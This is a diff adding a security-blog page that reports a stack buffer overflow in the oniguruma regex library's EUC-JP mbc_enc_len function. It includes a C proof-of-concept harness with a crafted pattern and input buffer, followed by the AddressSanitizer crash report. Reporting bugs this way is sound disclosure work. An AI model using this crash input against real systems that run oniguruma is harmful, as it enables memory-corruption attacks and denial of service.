@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>oniguruma: Stack buffer overflow in mbc_enc_len | Hello</title>
+    <meta name="description" content="1">
+    
+    
+    <link rel="preload" href="/assets/css/0.styles.153793e6.css" as="style"><link rel="preload" href="/assets/js/app.fb63a1b9.js" as="script"><link rel="preload" href="/assets/js/37.5a1d6d20.js" as="script"><link rel="prefetch" href="/assets/js/10.6aae25a8.js"><link rel="prefetch" href="/assets/js/11.e5a6ecb1.js"><link rel="prefetch" href="/assets/js/12.e6734d6c.js"><link rel="prefetch" href="/assets/js/13.c45be31f.js"><link rel="prefetch" href="/assets/js/14.7fe2edb8.js"><link rel="prefetch" href="/assets/js/15.7d96271b.js"><link rel="prefetch" href="/assets/js/16.d5c5556b.js"><link rel="prefetch" href="/assets/js/17.1a634ded.js"><link rel="prefetch" href="/assets/js/18.e6787f4e.js"><link rel="prefetch" href="/assets/js/19.a31276f8.js"><link rel="prefetch" href="/assets/js/2.6cf84733.js"><link rel="prefetch" href="/assets/js/20.f1ebd130.js"><link rel="prefetch" href="/assets/js/21.9fd25a7d.js"><link rel="prefetch" href="/assets/js/22.7ec64c15.js"><link rel="prefetch" href="/assets/js/23.a0a7d0ea.js"><link rel="prefetch" href="/assets/js/24.c17f3010.js"><link rel="prefetch" href="/assets/js/25.9bbf45e5.js"><link rel="prefetch" href="/assets/js/26.4f930016.js"><link rel="prefetch" href="/assets/js/27.b6d66343.js"><link rel="prefetch" href="/assets/js/28.ded43c8f.js"><link rel="prefetch" href="/assets/js/29.35b25580.js"><link rel="prefetch" href="/assets/js/3.88ebc755.js"><link rel="prefetch" href="/assets/js/30.a0b7fe3b.js"><link rel="prefetch" href="/assets/js/31.89d75be7.js"><link rel="prefetch" href="/assets/js/32.d7c054e6.js"><link rel="prefetch" href="/assets/js/33.9a5f3e99.js"><link rel="prefetch" href="/assets/js/34.ee5cfb6f.js"><link rel="prefetch" href="/assets/js/35.2054ab64.js"><link rel="prefetch" href="/assets/js/36.73bb48c1.js"><link rel="prefetch" href="/assets/js/38.c7d42097.js"><link rel="prefetch" href="/assets/js/39.fd864930.js"><link rel="prefetch" href="/assets/js/4.dc8e7db2.js"><link rel="prefetch" href="/assets/js/40.6c289e11.js"><link rel="prefetch" href="/assets/js/41.0ed23031.js"><link rel="prefetch" href="/assets/js/42.10b887da.js"><link rel="prefetch" href="/assets/js/43.d348e521.js"><link rel="prefetch" href="/assets/js/44.f98660b8.js"><link rel="prefetch" href="/assets/js/45.a141b3d0.js"><link rel="prefetch" href="/assets/js/46.3a3b1b86.js"><link rel="prefetch" href="/assets/js/47.d2f1996d.js"><link rel="prefetch" href="/assets/js/48.0bd12b2f.js"><link rel="prefetch" href="/assets/js/5.6adfd92b.js"><link rel="prefetch" href="/assets/js/6.f9bcea16.js"><link rel="prefetch" href="/assets/js/7.ad2cffde.js"><link rel="prefetch" href="/assets/js/8.8932bce4.js"><link rel="prefetch" href="/assets/js/9.892cc635.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.153793e6.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="page-main"><div class="component-nav-menu"><div class="placeholder"></div> <div class="search-wrapper"><div aria-haspopup="listbox" role="combobox" aria-owns="el-autocomplete-5254" class="el-autocomplete"><div class="el-input el-input--prefix"><!----><input type="text" autocomplete="off" valueKey="title" placeholder="请输入内容" fetchSuggestions="function () { [native code] }" triggerOnFocus="true" debounce="300" placement="bottom-start" popperAppendToBody="true" background-color="#eee" class="el-input__inner"><span class="el-input__prefix"><i class="el-input__icon el-icon-search"></i></span><!----><!----><!----></div><div role="region" class="el-autocomplete-suggestion el-popper" style="width:;display:none;"><div class="el-scrollbar"><div class="el-autocomplete-suggestion__wrap el-scrollbar__wrap el-scrollbar__wrap--hidden-default"><ul class="el-scrollbar__view el-autocomplete-suggestion__list"></ul></div><div class="el-scrollbar__bar is-horizontal"><div class="el-scrollbar__thumb" style="width:0;transform:translateX(0%);ms-transform:translateX(0%);webkit-transform:translateX(0%);"></div></div><div class="el-scrollbar__bar is-vertical"><div class="el-scrollbar__thumb" style="height:0;transform:translateY(0%);ms-transform:translateY(0%);webkit-transform:translateY(0%);"></div></div></div></div></div></div> <ul role="menubar" class="el-menu--horizontal el-menu" style="background-color:;"><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Home
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Blog
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        TimeLine
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Github
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        About
+      </li></ul></div> <div class="page-container"><div class="component-page"><div class="page-content"><!----> <div class="content custom"><h2 id="git-log"><a href="#git-log" aria-hidden="true" class="header-anchor">#</a> git log</h2> <div class="language- extra-class"><pre class="language-text"><code>commit 0516ddd34e4504c8a0f556b3a99f9c3c7a532626
+Author: K.Kosako &lt;kosako@sofnec.co.jp&gt;
+Date:   Wed Mar 28 09:06:47 2018 +0900
+
+    follow #83: update distribution files
+</code></pre></div><h2 id="test-code"><a href="#test-code" aria-hidden="true" class="header-anchor">#</a> test code</h2> <div class="language- extra-class"><pre class="language-text"><code>#include &lt;stdio.h&gt;
+#include &quot;oniguruma.h&quot;
+static int
+scan_callback(int n, int r, char* region, void* arg)
+{
+    return 0;
+}
+
+static int
+scan(regex_t* reg, char* str, char* end)
+{
+  int r;
+  OnigRegion *region;
+
+  region = onig_region_new();
+
+  r = onig_scan(reg, str, end, region, ONIG_OPTION_NONE, scan_callback, NULL);
+  if (r &gt;= 0) {
+    fprintf(stdout, &quot;total: %d match\n&quot;, r);
+  }
+  else { /* error */
+    char s[ONIG_MAX_ERROR_MESSAGE_LEN];
+    onig_error_code_to_str((OnigUChar* )s, r);
+    fprintf(stderr, &quot;ERROR: %s\n&quot;, s);
+    return -1;
+  }
+  
+  onig_region_free(region, 1 /* 1:free self, 0:free contents only */);
+  return 0;
+}
+
+static int 
+exec(OnigEncoding enc, OnigOptionType options,
+     char* apattern, char* astr,  int pattern_len,
+    char *end, OnigSyntaxType* sytax)
+{
+    int r;
+    regex_t* reg;
+    OnigErrorInfo einfo;
+    UChar* pattern = (UChar* )apattern;
+    UChar* str     = (UChar* )astr;
+
+    onig_initialize(&amp;enc, 1); 
+
+    r = onig_new(&amp;reg, pattern,
+                 pattern + pattern_len,
+                 options, enc, sytax , &amp;einfo);
+    if (r != ONIG_NORMAL) {
+        char s[ONIG_MAX_ERROR_MESSAGE_LEN];
+        onig_error_code_to_str(s, r, &amp;einfo);
+        fprintf(stderr, &quot;ERROR: %s\n&quot;, s); 
+        return -1; 
+    }   
+
+    r = scan(reg, str, end);
+    onig_free(reg);
+    onig_end();
+    return 0;
+}
+
+int main()
+{
+    int r;
+    int i;
+    char* pattern =&quot;\x28\x7c\x28\x00\x28\x3f\x3a\x5c\x67\x27\x31\x27\x29\x2a\x7c\x7c\x28\x29\x29\x2a\x7c\x28\x28\x28\x28\x29\x29\x29\x5c\x6b\x27\x31\x2d\x30\x27\x29\x29\x30\x7c&quot;;
+
+    char data[] = {0x0, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
+    r = exec(ONIG_ENCODING_EUC_JP,ONIG_OPTION_NONE,pattern,(char*) data,39, (char*) data + 64, ONIG_SYNTAX_DEFAULT);
+    return r;
+}
+</code></pre></div><h2 id="error"><a href="#error" aria-hidden="true" class="header-anchor">#</a> error</h2> <div class="language- extra-class"><pre class="language-text"><code>==24985==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffef1365e80 at pc 0x7f863add3dc2 bp 0x7ffef1363b40 sp 0x7ffef1363b30
+READ of size 1 at 0x7ffef1365e80 thread T0
+    #0 0x7f863add3dc1 in mbc_enc_len /home/github/onigurumag/src/euc_jp.c:56
+    #1 0x7f863adaf517 in match_at /home/github/onigurumag/src/regexec.c:3398
+    #2 0x7f863adbeb30 in onig_search_with_param /home/github/onigurumag/src/regexec.c:4837
+    #3 0x7f863adbd558 in onig_search /home/github/onigurumag/src/regexec.c:4596
+    #4 0x7f863adbf78e in onig_scan /home/github/onigurumag/src/regexec.c:4970
+    #5 0x400e8d in scan /home/github/onigurumag/fuzz2.c:17
+    #6 0x4011f3 in exec /home/github/onigurumag/fuzz2.c:55
+    #7 0x401404 in main /home/github/onigurumag/fuzz2.c:73
+    #8 0x7f863a97b82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
+    #9 0x400cb8 in _start (/home/github/onigurumag/fuzz+0x400cb8)
+
+Address 0x7ffef1365e80 is located in stack of thread T0 at offset 96 in frame
+    #0 0x4012dc in main /home/github/onigurumag/fuzz2.c:62
+
+  This frame has 1 object(s):
+    [32, 96) 'data' &lt;== Memory access at offset 96 overflows this variable
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow /home/github/onigurumag/src/euc_jp.c:56 mbc_enc_len
+Shadow bytes around the buggy address:
+  0x10005e264b80: f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10005e264b90: 00 00 f1 f1 f1 f1 00 f4 f4 f4 f2 f2 f2 f2 00 00
+  0x10005e264ba0: 00 f4 f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00
+  0x10005e264bb0: 00 02 f3 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00
+  0x10005e264bc0: 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00
+=&gt;0x10005e264bd0:[f3]f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00
+  0x10005e264be0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10005e264bf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10005e264c00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10005e264c10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10005e264c20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+==24985==ABORTING
+</code></pre></div></div></div></div></div></div></div>
+    <script src="/assets/js/app.fb63a1b9.js" defer></script><script src="/assets/js/37.5a1d6d20.js" defer></script>
+  </body>
+</html>
